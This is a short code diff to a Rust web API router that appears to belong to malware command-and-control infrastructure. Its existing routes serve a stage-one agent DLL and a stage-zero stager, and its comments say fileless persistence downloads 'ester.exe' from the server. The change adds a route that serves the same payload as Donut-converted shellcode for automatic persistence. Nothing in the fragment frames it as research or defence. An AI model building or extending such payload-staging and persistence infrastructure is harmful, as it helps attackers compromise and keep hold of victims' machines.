@@ -70,6 +70,8 @@ pub fn create_api_router(state: Arc<ApiState>) -> Router {
         .route("/api/stage1/agent_dll", get(handlers::download_agent_dll))
         // Stage0 stager: fileless persistence downloads ester.exe from here
         .route("/api/stage0/ester", get(handlers::download_ester))
+        // Stage0 PIC shellcode: auto-persist downloads donut-processed ester shellcode
+        .route("/api/stage0/ester.sc", get(handlers::download_ester_shellcode))
         .layer(cors)
         .with_state(state)
 }
